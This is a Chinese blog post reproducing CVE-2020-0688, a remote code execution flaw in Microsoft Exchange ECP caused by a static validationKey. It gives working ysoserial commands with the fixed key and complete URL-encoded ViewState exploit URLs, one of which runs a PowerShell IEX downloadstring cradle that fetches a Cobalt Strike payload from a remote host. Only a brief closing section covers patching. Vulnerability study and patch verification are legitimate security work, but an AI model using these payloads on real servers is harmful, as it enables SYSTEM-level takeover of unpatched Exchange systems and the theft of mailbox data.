**目录**

[漏洞描述](#t0 "漏洞描述")

[漏洞影响版本](#t1 "漏洞影响版本")

[漏洞复现](#t2 "漏洞复现")

[获取  ASP.NET.SessionID 和 \_\_VIEWSTATEGENERATOR 的值](#t3 "获取  ASP.NET.SessionID 和 __VIEWSTATEGENERATOR 的值")

[生成反序列化Payload](#t4 "生成反序列化Payload")

[验证存在漏洞](#t5 "验证存在漏洞")

[弹回CS](#t6 "弹回CS")

[漏洞修复](#t7 "漏洞修复")

* * *

漏洞描述
----

     漏洞产生的主要原因就是在Exchange ECP组件中发现邮件服务在安装的过程中不会随机生成[秘钥](https://so.csdn.net/so/search?q=%E7%A7%98%E9%92%A5&spm=1001.2101.3001.7020)，也就是说所有默认安装的Exchange服务器中的validationKey和decryptionKey的值都是相同的，攻击者可以利用静态秘钥对服务器发起攻击，在服务器中以SYSTEM权限远程执行代码。

漏洞影响版本
------

*   Microsoft Exchange Server 2010 Service Pack 3 Update Rollup 30
*   Microsoft Exchange Server 2013 Cumulative Update 23
*   Microsoft Exchange Server 2016 Cumulative Update 14
*   Microsoft Exchange Server 2016 Cumulative Update 15
*   Microsoft Exchange Server 2019 Cumulative Update 3
*   Microsoft Exchange Server 2019 Cumulative Update 4

漏洞复现
----

首先搭建Exchange漏洞环境，传送门：[Win12R2域控安装Exchange Server2016](https://xie1997.blog.csdn.net/article/details/107208758#%E5%AE%89%E8%A3%85Exchange%20Server2016 "Win12R2域控安装Exchange Server2016")

然后在普通域成员主机上以普通用户身份登录，访问Exchange登录页面：https://xie.com/ecp

### 获取  ASP.NET.SessionID 和 \_\_VIEWSTATEGENERATOR 的值

使用普通用户权限登录后台

![](https://img-blog.csdnimg.cn/20200710170550445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

访问 /ecp/default.aspx，抓包，在请求包中获得 ASP.NET\_SessionId 的值; 在响应包中获得 \_\_VIEWSTATEGENERATOR 的值，如未找到可尝试通用值“B97B4E27”

![](https://img-blog.csdnimg.cn/20200710224352792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 生成反序列化Payload

使用 ysoserial.exe 生成[反序列化](https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020)Payload，命令如下

```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c ping %USERDOMAIN%.uwhytz.dnslog.cn" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="B97B4E27" --viewstateuserkey="17acf91b-9c03-4938-b377-07cd65a8350f" --isdebug -islegacy
```


*   validationkey=CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF，这是固定的值，这是此漏洞产生的原因，修复补丁之后此值会做随机化处理 
*   \--generator="B97B4E27"，这是返回包中获得 \_\_VIEWSTATEGENERATOR 的值
*   \--viewstateuserkey="f98ed22e-98eb-4722-9dc9-153f3ed24be8"，这是请求包中ASP.NET.SessionID的值

![](https://img-blog.csdnimg.cn/20200710224516255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 验证存在漏洞

将生成的payload进行 url 编码

![](https://img-blog.csdnimg.cn/20200710224859519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

拼接为如下格式

```
https://xie.com/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&__VIEWSTATE=url编码后的payload
```


 直接在浏览器中访问即可触发漏洞。

```
https://xie.com/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&__VIEWSTATE=%2FwEyyAYAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAADqBDxSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI%2BDQoJIDxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IiIgT2JqZWN0VHlwZSA9ICJ7IHg6VHlwZSBEaWFnOlByb2Nlc3N9IiBNZXRob2ROYW1lID0gIlN0YXJ0IiA%2BDQogICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgPFN5c3RlbTpTdHJpbmc%2BY21kPC9TeXN0ZW06U3RyaW5nPg0KICAgICAgICA8U3lzdGVtOlN0cmluZz4iL2MgcGluZyBDT1JQLnV3aHl0ei5kbnNsb2cuY24iIDwvU3lzdGVtOlN0cmluZz4NCiAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICA8L09iamVjdERhdGFQcm92aWRlcj4NCjwvUmVzb3VyY2VEaWN0aW9uYXJ5PgtiaFCeZGafL6JPnBBrMu8x3zVcXA%3D%3D
```


![](https://img-blog.csdnimg.cn/20200710224827244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200710225012496.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

或者可以直接使用工具一键化探测目标是否存在漏洞

![](https://img-blog.csdnimg.cn/20200930003832843.png)

### 弹回CS

弹CobaltStrike shell的payload生成命令

```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/a'))\" > c:\123.txt" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="B97B4E27" --viewstateuserkey="17acf91b-9c03-4938-b377-07cd65a8350f" --isdebug -islegacy
```


![](https://img-blog.csdnimg.cn/20200710225430409.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200710225448114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

浏览器中访问如下链接，即可弹回cs

```
https://xie.com/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&__VIEWSTATE=%2FwEyrgcAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAADQBTxSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI%2BDQoJIDxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IiIgT2JqZWN0VHlwZSA9ICJ7IHg6VHlwZSBEaWFnOlByb2Nlc3N9IiBNZXRob2ROYW1lID0gIlN0YXJ0IiA%2BDQogICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgPFN5c3RlbTpTdHJpbmc%2BY21kPC9TeXN0ZW06U3RyaW5nPg0KICAgICAgICA8U3lzdGVtOlN0cmluZz4iL2MgcG93ZXJzaGVsbC5leGUgLW5vcCAtdyBoaWRkZW4gLWMgIklFWCAoKG5ldy1vYmplY3QgbmV0LndlYmNsaWVudCkuZG93bmxvYWRzdHJpbmcoJ2h0dHA6Ly80Ny4xMDQuMTI5LjI0OTo4MS9hJykpIiAmZ3Q7IGM6XDEyMy50eHQiIDwvU3lzdGVtOlN0cmluZz4NCiAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICA8L09iamVjdERhdGFQcm92aWRlcj4NCjwvUmVzb3VyY2VEaWN0aW9uYXJ5PguWVnJWRSJwh2STz8ULgpPoWRuOOg%3D%3D
```


![](https://img-blog.csdnimg.cn/20200710225340769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

漏洞修复
----

   微软官方已给出漏洞修复的补丁可以针对已安装exchange server版本下载针对性补丁安装，安装完补丁之后查看“web.config”文件查看是否对“validationkey”的值进行了随机化处理并执行poc验证漏洞是否修复成功。传送门：[Security Update Guide - Microsoft Security Response Center](https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2020-0688 "Security Update Guide - Microsoft Security Response Center")

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

参考文章：[ExchangeServer漏洞CVE-2020-0688复现](https://www.freebuf.com/news/228681.html "ExchangeServer漏洞CVE-2020-0688复现")

                  [微软Exchange服务器静态密钥缺陷导致远程代码执行分析（CVE-2020-0688）](https://www.4hou.com/posts/N54v "微软Exchange服务器静态密钥缺陷导致远程代码执行分析（CVE-2020-0688）")